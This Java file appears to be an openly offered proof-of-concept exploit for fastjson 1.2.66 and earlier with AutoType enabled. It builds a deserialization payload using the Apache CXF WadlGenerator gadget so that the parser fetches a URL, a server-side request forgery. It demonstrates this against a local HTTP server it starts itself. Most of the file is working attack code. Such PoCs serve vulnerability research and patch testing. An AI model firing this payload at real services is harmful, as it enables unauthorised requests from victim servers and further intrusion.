package com.threedr3am.bug.fastjson.ssrf;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.HTTPServer;

/**
 * fastjson <= 1.2.66 RCE，需要开启AutoType (Discovered by threedr3am) 水
 *
 *
 * <dependency>
 *       <groupId>org.apache.cxf</groupId>
 *       <artifactId>cxf-core</artifactId>
 *       <version>3.3.5</version>
 * </dependency>
 * <dependency>
 *       <groupId>org.apache.cxf</groupId>
 *       <artifactId>cxf-bundle</artifactId>
 *       <version>2.7.18</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class ApacheCxfSSRFPoc {

  static {
    HTTPServer.PORT = 23234;
    HTTPServer.run(null);
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String payload = "{\"@type\":\"org.apache.cxf.jaxrs.model.wadl.WadlGenerator\",\"schemaLocations\": \"http://127.0.0.1:23234?a=1&b=22222\"}";
    try {
      JSON.parse(payload);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
